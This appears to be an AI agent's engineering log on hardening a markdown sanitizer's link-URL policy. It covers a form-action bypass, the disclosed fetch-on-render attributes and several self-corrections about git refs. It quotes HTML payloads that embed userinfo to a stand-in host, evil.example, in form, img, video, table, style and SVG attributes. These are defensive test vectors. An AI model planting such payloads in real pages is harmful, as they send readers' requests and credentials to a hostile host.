# C-4 — `<form action>` bypassed the sink that F-1 closed

2026-07-29. Branch `hardening/markdown-href`, clone `/workspace/farmtable-mdhref`.
Raised by `review-markdown-href` on the re-gate of `b634c602`, which confirmed
F-1 as written is closed at `markdown.ts:126` and then found this beside it.

## The defect, reproduced before it was believed

```
<form action="https://github.com@evil.example/"><button>View pull request #482</button></form>
```

One submit control. No `method`, so GET. Clicking it contacts `evil.example` and
hands it the userinfo `github.com:`, with the button's own label chosen by the
same author who chose the address. That is **F-1's own impact sentence at F-1's
own sink** — reads as one host, contacts another, leaks credentials on click —
and it walked past the URL policy untouched.

Measured on a faithful replica of the shipped pipeline before anything changed
(`/workspace/mdhref-rig/measure-form-action.mjs`), with the hook as it stood at
`b634c602`:

```
SURVIVES  form action              <form action="https://github.com@evil.example/">…
SURVIVES  form action, method=post
refused   input formaction         <form><input type="submit"></form>
refused   button formaction        <form><button>Go</button></form>
refused   a href (control)         <p><a>x</a></p>
```

## Why it got through, and what it was NOT

**The predicate was never wrong.** `isPermitted` returns the correct answer for
`https://github.com@evil.example/` and always did — it is refused at
`markdown.ts:126` on userinfo, exactly like the `href` form of the same URL. The
hook simply never asked it, because `LINK_ATTRS` did not contain `action`.

So C-4 is not a second parser, not a carve-out, and not a policy gap. **It is an
enumeration that fell behind the thing it enumerates.** The fix is one array
entry. Anything larger would be redesigning a component that measured correct.

The failure that let it sit there is in the prose, and it is worth more than the
fix. The docblock at the list said:

> NOT MEASURED: whether any further attribute permitted by a **future**
> DOMPurify default navigates.

Every word true, and the tense wrong. `action` was permitted **then**, navigated
**then**, and was absent from the list **then**. A reader checking whether the
list was complete would have read that sentence as "a risk about later versions"
and stopped — the sentence routed them past a live hole while sounding careful.
**A present-tense gap written in the future tense is worse than no disclosure,
because it consumes the attention that would have found it.** It is now stated
in the present tense, and it says plainly that nothing reconciles this list
against DOMPurify's allowed-attribute set today.

## What landed

| | |
|---|---|
| `markdown.ts:54` | `LINK_ATTRS = ['href', 'xlink:href', 'action']` — one entry |
| `markdown.ts:38-53` | the list's docblock: why `action`, the measured `formaction` negative, and the gap restated in the present tense |
| `markdown.ts:215-236` | scope paragraph: names all three attributes, and corrects the accepted-risk count (below) |
| `markdown-href.test.ts` | `testFormActionIsPoliced`, pinned, both polarities |

`url-binding-scan.test.ts` is untouched, as instructed — it has zero changes
across `89a974da..b634c602` and stays that way.

### RED before GREEN

Written before the array entry, against `b634c602`:

```
Error: a credential-bearing form action survived
  (got https://github.com@evil.example/, want null)
  at testFormActionIsPoliced (markdown-href.test.js:510:5)
not ok 4 - web/.tmp-test/util/markdown-href.test.js
```

GREEN after, with the arm carrying four rows so it cannot pass by accident:
the GET vector refused; the POST vector refused (the URL policy makes no
distinction between methods and neither may the arm); an ordinary
`https://example.com/search` action KEPT; a same-origin `/tasks/search` action
KEPT. Plus the Option B row — the button's label survives the refusal, because
removing the `action` must not remove the control's own text.

`formaction` is deliberately **not** pinned. DOMPurify's defaults strip it before
any hook runs, measured on this version; pinning somebody else's behaviour as if
it were ours makes a guard look wider than its evidence. It is recorded in the
docblock instead, with the consequence: if `formaction` ever survives an upgrade,
it belongs in the list.

## R-2 — the accepted risk was sized at one attribute and it is four

Separate from C-4, prose only, and **the `src` ruling is not re-litigated**. The
scope paragraph named `src` alone as the credential leak that is knowingly not
guarded. Measured on the same replica, all four survive with credentials intact
and all four fetch **on render, with no click at all**:

| attribute | measured survivor |
|---|---|
| `src` | `<img src="https://github.com@evil.example/x.png">` |
| `srcset` | `<img srcset="https://github.com@evil.example/x.png 1x">` |
| `poster` | `<video poster="https://github.com@evil.example/p.png">` |
| `background` | `<table background=…>` **and** `<td background=…>`, both kept |

The ruling stands and no guard was added. Only the count changed: **a disclosure
that understates its own scope is not a disclosure**, and whoever revisits the
`src` decision is revisiting four attributes, not one.

## The general shape, since this is the second time tonight

C-1/C-2/C-3 were a bespoke parser that was weaker than the function it carved
around. C-4 is a list that was shorter than the attribute set it filtered.
**Both are the same failure at different sizes: a local restatement of a fact
that lives somewhere else.** The predicate was fixed by deleting the restatement
and asking the platform. The list cannot be fixed that way today — nothing walks
DOMPurify's allowed-attribute set and asserts that nothing navigable is missing
here. That reconciliation is the durable fix and IT IS NOT BUILT; until it is,
every DOMPurify upgrade silently re-opens this question and no gate will say so.
Filed, not closed, and stated in the code rather than only here.

## Gates, re-run

| gate | result |
|---|---|
| `npm test` | 7 files, 7 pass, 0 fail |
| `go build ./...` | exit 0 |
| `go vet ./...` | exit 0 |
| `go test ./...` | 11 ok, 0 FAIL |
| `node scripts/ci-suite-manifest.mjs` | exit 0 — `enumerated=7 executed=7 missing=0 (floor 7)`, surplus=0, required=4 |
| fixtures | `cases=45 divergent=13 base_dependent=6`, suite floor 7 |

Nothing pushed.

**Correction, made after this line was first written.** It originally read
"`main` unmoved at `7bb0c756`". **There is no `main` in this clone** — no
`refs/heads/main` and no `refs/remotes/origin/main`; `git rev-parse main` exits
non-zero. The local refs are `hardening/markdown-href` and
`task-state-web-ui-v2`. What `7bb0c756` actually is: the **merge-base of this
branch**, fourteen commits back, i.e. the base I branched from.

"Unmoved" was therefore trivially true of a thing that does not exist, and it
was reported four times. It read as a safety claim — *I have not disturbed the
mainline* — while asserting nothing at all, and nobody could have caught it
without running `rev-parse` in this specific clone, because the sentence names
no clone. **A reassurance about a ref you never resolved is the same defect as a
count nobody reconciled**, which is the finding this very file was opened to
record. Third instance in one document.

The accurate statement: nothing is pushed, no ref outside
`hardening/markdown-href` has been written in this clone, and `7bb0c756` is this
branch's base and is an ancestor of its tip.

---

## `main`: THE CORRECTION ABOVE IS UNRESOLVABLE, WHICH IS WORSE THAN BEING FALSE

**THE ONE FACT NOBODY BUT ME HAD: every `rev-parse` behind `7fa0ceeb` was run
in `/workspace/farmtable-mdhref`, with that as the process working directory.**
Four agents spent four exchanges on a sentence that could not be evaluated
without it, and I am the only one who could supply it. That is the defect in one
line: **the missing datum was not a ref, it was a directory.**

Appended, not edited. Everything above this heading is `7fa0ceeb`'s text
verbatim and stays on the record wrong, because a retraction that edits its
predecessor out of existence leaves no way to see what was believed.

Held out of the push by `em-hardening`, who measured it; extended by
`audit-markdown-href` and `review-markdown-href`, whose tables I reproduced
here rather than forwarded.

### a. Every store, every spelling, one negative control per store

`git rev-parse --verify <ref>`, stderr open, run by me across the four stores I
can read. `zzqqxx` returned rc=128 in all four, so no row is a dead instrument:

| store | `refs/heads/main` | `refs/remotes/origin/main` | bare `main` |
|---|---|---|---|
| `/workspace/farmtable` | **0** `7bb0c756` | **0** `7bb0c756` | **0** |
| `/workspace/farmtable-mdhref` (this log's clone) | 128 | **0** `7bb0c756` | 128 |
| `/workspace/review-mdhref` | 128 | 128 | 128 |
| `/workspace/audit-mdhref` | 128 | 128 | 128 |

`review-markdown-href`'s mechanism, and the table is its shape: cloning from a
path copies the source's `refs/heads/*` into the child's `refs/remotes/origin/*`.
The leg clone has no `refs/heads/main`, so clones **of** the leg clone inherit no
`origin/main` at all. **One spelling lost per hop: two, then one, then zero.**

### b. The sentence is not false. It has no single truth value

"There is no `main` in this clone" is **true** of `/workspace/review-mdhref` and
of `/workspace/audit-mdhref`, and **false** of `/workspace/farmtable-mdhref`,
which is the clone it was written in and committed to. A sentence whose subject
is `this clone` in a file that four agents read from four different stores does
not have a truth value to check. **That is a worse defect than being false**,
because being false is detectable.

And `7fa0ceeb` diagnosed exactly this: its stated fault in the sentence it
retracted was "nobody could have caught it… because the sentence names no
clone". It then says "this clone" three times and "this specific clone" once,
and **names no clone either.** It re-derived the claim and did not re-derive the
form. Generalising `em-hardening`: **a ref citation is a (store, ref) pair
exactly as a line citation is a (file, line) pair.** `main` is not a ref name;
tonight it is three ref names that disagree in every store we own.

**The fix is naming the store, and naming the store fixes both sentences.**

### c. Two conjuncts true, one false, and the true ones point the wrong way

This is `audit-markdown-href`'s catch and it is the part that would have
survived a narrow fix:

- `refs/heads/main` absent — **TRUE** in this clone.
- `refs/remotes/origin/main` absent — **FALSE**. It is `7bb0c756` exactly.
- `git rev-parse main` exits non-zero — **TRUE, and true for a reason that is
  not absence.** `rev-parse --verify` does not DWIM to remote-tracking refs;
  gitrevisions searches `refs/<n>`, `refs/tags/<n>`, `refs/heads/<n>`,
  `refs/remotes/<n>`, `refs/remotes/<n>/HEAD`, and `refs/remotes/origin/main`
  is on none of them. That convenience belongs to `checkout`, not `rev-parse`.

**Three conjuncts, all pointing at absence, only one of them false — which is
why the paragraph read as verified.** Repairing the middle conjunct alone would
leave the third still implying the conclusion. Both are corrected here.

The instrument I used to *confirm* the absence failed in the same direction:

```
git for-each-ref --format='%(refname) %(objectname:short)' | grep -E '/main$'
```

The format appends the sha, so `$` anchors after the **object id** and can never
follow a refname. It reported "none" for `hardening/markdown-href` too — a ref
on screen at the time. **Two instruments failing toward the same answer are not
two instruments.** Caught only because the re-run carried a known-present
positive control and it came back 0 when it had to come back 1. Respelled
`--format='%(refname)'`: 1 match in `/workspace/farmtable-mdhref`, 18 in
`/workspace/farmtable`, fabricated-name control 0.

### d. "main unmoved at 7bb0c756" was TRUE, and it is restored

Not imprecise. **True.** True of `refs/heads/main` in `/workspace/farmtable`,
which `em-hardening` read as `7bb0c756` immediately before and immediately after
pushing `1d826006`. True of `refs/remotes/origin/main` in
`/workspace/farmtable-mdhref`. True at every reading taken tonight.

And the retraction is wrong **as a claim about `/workspace/farmtable-mdhref`**,
which is where it was written and committed. It is **true** as a claim about
`/workspace/review-mdhref` and `/workspace/audit-mdhref`. Stating it that way
rather than "the retraction was wrong" is `review-markdown-href`'s correction to
`em-hardening`'s instruction, and it is the accurate one: **the fault was never
the truth value, it was that the sentence had none until a store was named.** A
false claim is refuted once. A deictic one is re-litigated in every store, and
this thread is the proof — four agents, four stores, four answers, all correct.

**Warrant and claim retract separately, and only the warrant needed
withdrawing.** My warrant was defective — `git reflog show origin/main` in
`/workspace/farmtable-mdhref` is empty (rc=0, zero lines, against a control that
printed three), so no movement record was ever available to me and the verb was
unearned when written. That is a real defect and it is the only one. It does not
touch the claim, and `7fa0ceeb` withdrew the claim.

**The accurate statement, with the stores named:** nothing was pushed by me; no
ref outside `hardening/markdown-href` has been written by me in
`/workspace/farmtable-mdhref`; `refs/heads/main` in `/workspace/farmtable` and
`refs/remotes/origin/main` in `/workspace/farmtable-mdhref` both read
`7bb0c756`.

**Containment, in the store-argument form** — `em-hardening`'s binding spelling,
which is `review-markdown-href`'s rule fused with `audit-markdown-href`'s point
D. A gate precondition a second-hop reviewer cannot evaluate is not a gate, it is
a relay; and **a sha is store-independent where `main` is not**, so the gate
takes shas and a path, never a ref name:

```
is-ancestor(7bb0c756, <tip>) rc=0, EVALUATED IN /workspace/farmtable-mdhref
reverse direction              rc=1   <- positive control, in the same invocation
```

Anyone holding both objects can re-run that in their own store. Nobody needs a
ref named `main` to check it, which is the entire point: **the previous form of
this reassurance was unrunnable in three of the four clones that had to read
it.**

### The reusable part

**A correction is a publication and takes the same controls as the claim it
replaces — and it arrives pre-certified, because nobody audits a confession.**
Ask of every retraction: *does my measurement refute the claim, or only my
warrant for it?* If the second, keep the claim and say so. The evening's rule
needs its converse:

> A concession you reproduced is a measurement. A concession you only found
> persuasive is a forwarded claim with your name on it — **including when the
> claim is against yourself, which is the case where it feels least like one.**

---

## THE SENTINEL, RECORDED HERE BECAUSE ITS TWO AUTHORS BOTH LACK A PLACE FOR IT

Out of scope for this branch and landed here on `em-hardening`'s instruction,
because the alternative is losing it. `farmtable-architect-auth` had the remit
and their document is terminated; I have a log and no jurisdiction over the
subject. **Both refusals were correct and together they lose the fact.** Written
down so that whoever picks up the index repair can ask for it rather than
reconstruct it — reconstruction is what produced four independent proposals of
the same destructive write tonight, and a fact rebuilt from memory comes back
without its control arm.

**The joint.** A repair recipe derives its path list from a snapshot of the
index, then feeds it to `git reset --pathspec-from-file`. Each half is sound.
But a derived list can be **legitimately empty** — nothing matched, nothing to
do — and an empty pathspec file makes `reset` operate on the **whole index**, at
rc=0. Neither defect is in either half. It is in the joint, and nobody owns a
joint.

**The construction.** Append a run-time-randomised, deliberately non-matching
path to the derived list. The list can then never be empty, so the whole-index
branch is unreachable. **This is not a guard and cannot be dead code**: it is a
property of the argument, not a check that has to fire. An instrument that dies
mid-run still cannot produce the catastrophic branch.

**Its bound, which is the half that matters.** It prevents **over**-reach only.
Under-reach — a derived list that is missing entries it should have had —
becomes a silent rc=0 no-op and the sentinel says nothing about it. Measured,
not assumed:

- **ARM 2 (mine)** — inertness of a non-matching sentinel, established on the
  command line.
- **ARM A (`dev-onhold-toolbar`)** — the same inertness for
  `--pathspec-from-file`, which is the spelling the recipe actually uses. My
  claim rested on their run until they made it; ARM 2 alone did not cover it.
- **ARM 5 / 5b (`farmtable-architect-auth`)** — a *dead* census combined with
  the sentinel leaves the index **UNCHANGED**. 5b is the control arm, and it is
  the part that bounds the claim rather than extends it.

I ran the treatment and `architect-auth` ran the control, and neither of us had
the experiment alone. **A principle that does not generate the construction is a
description, not a method** — theirs sat inert for two hours until it was built,
and mine would have been overstated without their control.

**Cite the ARM 2 / ARM A / ARM 5+5b set, not any one sentence from it.**

---

## THE ARCHIVED COPY OF `red-per-arm.mjs` IS STALE AND LOOKS COMPLETE

`/scion-volumes/scratchpad/projects/farmtable/reports/mdhref-rig/red-per-arm.mjs`
carries **15** arms. The live rig at `/workspace/mdhref-rig/red-per-arm.mjs`
carries **16**. Set-differenced rather than counted:

```
in live, not in archive:   testFormActionIsPoliced
in archive, not in live:   (none)          <- control direction, empty as expected
```

The missing arm is **C-4's**, the whole subject of this log. Anyone re-running
the archived copy to reproduce the RED evidence gets fifteen green arms, a clean
exit, and **no indication that the vector this document exists to record was
never executed**. The file's own header warns that a fixed output path destroys
its own evidence; this is the same failure one level up — **a snapshot of an
instrument ages into a different instrument with the same name.**

Not repaired: `/scion-volumes/scratchpad` is under a write freeze, and it is not
mine to edit in any case. Recorded so the discrepancy is discoverable from the
branch. If the archive is refreshed, the arm count is the check.

---

## POSTSCRIPT: MY OWN "MISSING FILES" FINDING WAS AN INVERTED READING

I measured the rulings corpus and published that `eng-manager-state.md` (cited
25×) and `BRIEF-RULES.md` (cited 7×) **do not exist anywhere**. Both exist.
`em-hardening` supplied the resolution; reproduced here with a control
(`/workspace/zzqqxx-no-such-file.md` ABSENT):

```
/workspace/.eng-manager-state.md                 PRESENT  1800 lines   <- leading DOT
/scion-volumes/.../farmtable/.eng-manager-state.md PRESENT   83 lines  <- same basename, stale
/scion-volumes/.../farmtable/briefs/_BRIEF-RULES.md PRESENT            <- leading UNDERSCORE
```

The citations dropped a leading `.` or `_`. **Refining the mechanism, because
the obvious version is wrong for the tool I actually used:** a leading dot does
hide a file from `ls` and from a `*` glob — measured, `ls /workspace/*eng-manager-state.md`
is a no-match while `.*eng-manager-state.md` resolves. But `find` was my probe,
and `find -name '.eng-manager-state.md'` returns **1**. `find` sees dotfiles
perfectly well. My probe returned 0 for the plain reason that **the basename I
was given differs from the basename on disk by one character**. Two distinct
mechanisms, and only one of them is about dotfiles.

The consequence stands and is worse than the mechanism: an absence query whose
spelling comes from the citation cannot detect that the citation is misspelled,
**and the control a careful reader would add is written in the same wrong
spelling, so it cannot fire either.** Third time tonight I have taken an empty
result for a property of the world, and second time in this document.

`/workspace/.eng-manager-state.md` is the canonical, live copy. The 83-line
scratchpad file with the same basename is a stale stub that **announces
nothing**, so a reader who lands on it gets a wrong answer that reads like a
right one. Two referents that agree are a nuisance; two that disagree are a
silent wrong answer.

Standing consequence for this log: the parked auth findings I filed via
`OUT-OF-SCOPE-BACKLOG.md` resolve, and so does everything routed through
`eng-manager-state.md`. **Nothing I filed tonight is lost.**

---

## R-3 — the disclosure was resized twice and the second size was the worse error

Re-gate of `2031c384`. C-1, C-2, C-3, C-4 and F-1 all closed on that object.
R-3 was the only Required item and it is a comment: no code, no guard, no new
pin, no `LINK_ATTRS` change.

**Correction to the record first.** F-1's closure line is `markdown.ts:145`, the
userinfo refusal — not `:148`. The same-origin carve-out at `:146` returns true
before `:148` is reached, so a same-origin credential reference is refused *only*
by `:145`, because `URL.origin` excludes userinfo. Mutation-proved by the gate.
Nothing to change; the line is recorded here so the log names it correctly.

### What was wrong

The R-2 paragraph in the section above said the accepted risk was **four
attributes wide**. Measured against the shipped policy, with `<a href>` and
`<form action>` as negative controls in the same run (both refused, so the
survivals are results and not a dead harness):

| survivor | spelling |
|---|---|
| `style` | `background-image:url(…)`, `background:url(…)`, `list-style-image:url(…)` |
| SVG functional IRIs | `fill="url(…)"`, `filter="url(…)"`, and also `mask=` and `clip-path=`, which the finding did not name |

So the number was wrong. But the number being wrong is not the finding — **the
number was the finding's defect.** "`src`" reads as an example; "four attributes
wide" reads as the output of an audit, and there was no audit. A count in that
paragraph would need precisely the reconciliation that the `LINK_ATTRS` docblock
four screens above declares IS NOT BUILT. The disclosure would have re-committed,
in itself, the error it exists to describe.

The first fix instruction I was given was to widen the count to six. That is the
same defect one notch along, and it was withdrawn before I wrote it. **A
discovery-bounded count restated after each discovery is not converging on the
truth; it is reporting the search history as if it were the boundary.** The
paragraph now states the class — *any permitted attribute that causes a fetch on
render* — and gives the known members as expressly non-exhaustive examples.

### Why the class exists, verified in the library rather than inferred

`style` is not an oversight in our hook. Read in the installed build rather than
taken on report:

- `node_modules/dompurify/dist/purify.cjs.js:683` — `DEFAULT_URI_SAFE_ATTRIBUTES`
  contains `style`.
- `:1801` — the attribute loop reaches `else if (URI_SAFE_ATTRIBUTES[lcName]) ;`
  **before** the `IS_ALLOWED_URI` test. A URI-safe name is accepted by an empty
  statement and the URI policy is never evaluated for it.

So DOMPurify is not failing to parse CSS. **It is declining to police the
attribute at all, by configuration, by default.** That is a stronger and more
useful fact than "DOMPurify does not parse CSS", because it says where to look
next: `DEFAULT_URI_SAFE_ATTRIBUTES`, not the CSS grammar.

Two mechanisms populate the class, and neither is a hole in this hook:

1. `style` — exempted from the URI policy entirely (above).
2. `src`/`srcset`/`poster`/`background` — genuinely checked, and they pass,
   because DOMPurify's default URI policy has no rule about userinfo. That is
   the same fact that made F-1 possible at `href`.

The reusable half: **a URL can sit inside an attribute value rather than be one,
and an attribute-name policy cannot see it.** Distinct from C-4, where the
attribute *was* URL-typed and the list was merely short.

**This widening was derived from `ALLOWED_ATTR` and
`DEFAULT_URI_SAFE_ATTRIBUTES`, not from fixtures** — which is why it reached a
class the fixtures had no case for. A fixture corpus can only re-find what
somebody already thought of.

### Two NOT MEASURED, in those words

- Whether a browser **transmits the userinfo on a subresource fetch**. Browsers
  block embedded credentials there, so the fetch is live and the credential half
  may already be mitigated by the platform. JSDOM cannot answer it. This applies
  to the whole class, including the members disclosed before the note existed.
  Not resolved in either direction.
- Whether any browser **dereferences an external SVG functional IRI at all**.
  Several restrict `fill`/`filter`/`mask`/`clip-path` to same-document
  references, in which case those members are survival without a fetch. Survival
  is measured; dereference is not.

Neither was upgraded to "safe" and neither to "vulnerable". The measured claim is
narrow: the value survives sanitising with the userinfo intact.

### Gates

`npm test` 7/7/0 · `go build` 0 · `go vet` 0 · `go test` 11 ok / 0 FAIL ·
`ci-suite-manifest` exit 0 · fixtures 45 cases / 13 divergent ·
`url-binding-scan.test.ts` **zero changes vs `89a974da`**, checked with a
control path in the same invocation that did report a diff, so the empty result
is a measurement and not a dead command. `url-scheme-validation-r2-fix-round.md`
untouched. Nothing pushed.

**Method note, since it nearly cost me two gate numbers.** My first gate run
reported `go build=0`, `go vet=0` and a clean `url-binding-scan` diffstat that
were all measured from the wrong working directory — the earlier `cd` into
`web/` persisted, so `./...` matched no packages and the repo-relative pathspecs
matched nothing. The control path caught it: a file I *knew* had changed also
reported empty. `manifest exit=1` in a later run was the same fault, and that one
crashed loudly, which is the safe direction. **A gate re-run in the wrong
directory produces the same bytes as a gate that passed**, and the only reason
this log does not contain four fabricated zeroes is the positive control.
